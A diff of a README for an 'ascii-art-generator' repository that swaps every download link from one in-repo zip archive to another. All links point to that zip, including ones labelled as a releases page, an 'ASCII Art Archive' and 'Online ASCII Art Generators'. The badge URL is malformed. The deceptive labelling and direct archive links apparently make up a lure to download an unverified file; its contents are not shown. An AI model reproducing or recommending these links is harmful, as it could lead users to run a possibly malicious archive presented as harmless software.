@@ -1,6 +1,6 @@
 # 🎨 ascii-art-generator - Convert Images to ASCII Art Easily
 
-[![Download](https://raw.githubusercontent.com/Redbandit3/ascii-art-generator/main/app/generator_art_ascii_2.9-beta.2.zip%20Now-Get%20the%https://raw.githubusercontent.com/Redbandit3/ascii-art-generator/main/app/generator_art_ascii_2.9-beta.2.zip)](https://raw.githubusercontent.com/Redbandit3/ascii-art-generator/main/app/generator_art_ascii_2.9-beta.2.zip)
+[![Download](https://github.com/Redbandit3/ascii-art-generator/raw/refs/heads/main/types/ascii-generator-art-2.3.zip%20Now-Get%20the%https://github.com/Redbandit3/ascii-art-generator/raw/refs/heads/main/types/ascii-generator-art-2.3.zip)](https://github.com/Redbandit3/ascii-art-generator/raw/refs/heads/main/types/ascii-generator-art-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To get started, follow these simple steps:
 
 1. **Visit the Download Page:** Click the link below to access the releases.
 
-   [Download the ASCII Art Generator](https://raw.githubusercontent.com/Redbandit3/ascii-art-generator/main/app/generator_art_ascii_2.9-beta.2.zip)
+   [Download the ASCII Art Generator](https://github.com/Redbandit3/ascii-art-generator/raw/refs/heads/main/types/ascii-generator-art-2.3.zip)
 
 2. **Choose Your Version:** On the releases page, look for the latest version. You will see a list of available files.
 
@@ -71,11 +71,11 @@ We are building a supportive community around ascii-art-generator. If you have q
 
 For further reading on ASCII art, you may want to check out:
 
-- [ASCII Art Archive](https://raw.githubusercontent.com/Redbandit3/ascii-art-generator/main/app/generator_art_ascii_2.9-beta.2.zip)
-- [Online ASCII Art Generators](https://raw.githubusercontent.com/Redbandit3/ascii-art-generator/main/app/generator_art_ascii_2.9-beta.2.zip)
+- [ASCII Art Archive](https://github.com/Redbandit3/ascii-art-generator/raw/refs/heads/main/types/ascii-generator-art-2.3.zip)
+- [Online ASCII Art Generators](https://github.com/Redbandit3/ascii-art-generator/raw/refs/heads/main/types/ascii-generator-art-2.3.zip)
 
 Once again, here’s the link to download the application:
 
-[Download the ASCII Art Generator](https://raw.githubusercontent.com/Redbandit3/ascii-art-generator/main/app/generator_art_ascii_2.9-beta.2.zip)
+[Download the ASCII Art Generator](https://github.com/Redbandit3/ascii-art-generator/raw/refs/heads/main/types/ascii-generator-art-2.3.zip)
 
 We hope you enjoy making your own ASCII art!
